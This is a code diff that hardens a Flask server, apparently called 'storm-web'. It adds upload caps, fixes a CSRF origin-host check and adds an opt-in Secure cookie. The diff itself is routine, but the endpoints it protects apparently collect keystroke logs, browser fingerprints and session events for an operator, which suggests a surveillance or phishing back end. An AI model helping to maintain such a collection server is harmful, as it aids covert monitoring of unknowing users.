@@ -25,6 +25,7 @@ from flask import Flask, jsonify, request
 
 # Per-endpoint-type upload ceilings (bytes).  Generous by design.
 UPLOAD_TYPE_LIMITS = {
+    '/receiver': 30 * 1024 * 1024,                # P16: was uncapped (only 64MB global)
     '/api/fingerprint': 1 * 1024 * 1024,          # fingerprints are small
     '/api/keystrokes': 2 * 1024 * 1024,           # log batches
     '/api/session/': 4 * 1024 * 1024,             # session event batches
@@ -71,6 +72,22 @@ def _header_host(header_value: str) -> str:
         return ''
 
 
+def _request_hostname() -> str:
+    """Request host WITHOUT the port.
+
+    P16 fix: ``Origin``/``Referer`` carry only a hostname, but
+    ``request.host`` includes ``:port``, so the old comparison
+    ('host' != 'host:port') 403'd **every** browser-originated mutating
+    request that rode an operator session.  curl-like clients were
+    unaffected (no Origin header -> early return), which is why the audit
+    harness never caught it.
+    """
+    try:
+        return (urlsplit('//' + (request.host or '')).hostname or '').lower()
+    except Exception:
+        return ''
+
+
 def csrf_gate():
     """403 cross-origin mutating requests that ride an operator session."""
     if request.method in SAFE_METHODS:
@@ -81,7 +98,7 @@ def csrf_gate():
     referer = request.headers.get('Referer') or ''
     if not origin and not referer:
         return None  # non-browser client; SameSite=Lax covers browsers
-    host = (request.host or '').lower()
+    host = _request_hostname()
     candidate = origin or referer
     if _header_host(candidate) != host:
         return jsonify({'error': 'CSRF validation failed'}), 403
@@ -123,6 +140,19 @@ def register_hardening(app: Flask, max_upload_mb: int = None) -> None:
     app.config['MAX_CONTENT_LENGTH'] = cap_mb * 1024 * 1024
     app.config['SESSION_COOKIE_HTTPONLY'] = True
     app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+    # P16: opt-in Secure cookie.  Off by default because the LAN entry point is
+    # plain http:// and a Secure cookie would simply stop being sent there.
+    # Turn on (Settings.json {"session_cookie_secure": true}) if you only ever
+    # reach the box through the https tunnel.
+    try:
+        import json as _json
+        _root = os.path.dirname(os.path.dirname(os.path.dirname(
+            os.path.abspath(__file__))))  # -> storm-web
+        with open(os.path.join(_root, 'Settings.json')) as _fh:
+            if _json.load(_fh).get('session_cookie_secure'):
+                app.config['SESSION_COOKIE_SECURE'] = True
+    except Exception:
+        pass
     app.before_request(upload_cap_gate)   # cheap check first
     app.before_request(csrf_gate)
     app.after_request(csp_header)         # P9.5: CSP on HTML responses
